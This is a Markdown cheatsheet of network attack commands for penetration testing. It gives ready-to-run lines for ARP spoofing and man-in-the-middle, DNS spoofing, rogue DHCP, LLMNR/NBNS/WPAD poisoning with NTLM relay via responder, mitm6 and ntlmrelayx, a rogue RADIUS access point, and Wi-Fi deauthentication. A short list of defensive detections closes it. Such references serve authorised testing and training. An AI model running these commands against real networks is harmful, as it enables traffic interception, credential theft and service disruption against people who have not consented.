# Network Attacks Cheatsheet

## ARP Spoof / MITM

```bash
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
arpspoof -i eth0 -t <victim> <gateway>
arpspoof -i eth0 -t <gateway> <victim>
ettercap -T -q -i eth0 -M arp:remote /<victim>// /<gateway>//
bettercap -iface eth0
```

## DNS Poisoning / Capture

```bash
dnsspoof -i eth0 -f hosts.txt
ettercap -T -q -i eth0 -P dns_spoof -M arp:remote /<victim>// /<gateway>//
tshark -i eth0 -Y "dns.flags.response == 0" -T fields -e ip.src -e dns.qry.name
```

## DHCP / Rogue Services

```bash
yersinia -G
dnsmasq --interface=eth0 --dhcp-range=10.10.10.100,10.10.10.200,12h
```

## LLMNR / NBNS / WPAD

```bash
responder -I eth0 -wrf
mitm6 -i eth0
ntlmrelayx.py -tf targets.txt -smb2support
```

## Traffic Capture

```bash
tcpdump -ni eth0 host <victim>
tcpdump -ni eth0 port 53
tshark -i eth0 -q -z io,phs
```

## 802.1X / NAC Quick Checks

```bash
eapol_test -c peap.conf -a <radius_ip> -p 1812 -s <shared_secret>
hostapd-wpe hostapd-wpe.conf
```

## Wireless Recon

```bash
airmon-ng start wlan0
airodump-ng wlan0mon
airodump-ng --bssid <bssid> -c <channel> -w capture wlan0mon
aireplay-ng -0 5 -a <bssid> wlan0mon
```

## Common Defensive Detections

- new ARP mappings for gateway or DC
- sudden LLMNR / NBNS spikes
- duplicate DHCP offers
- TLS interception cert mismatch
- unexpected WPAD responses
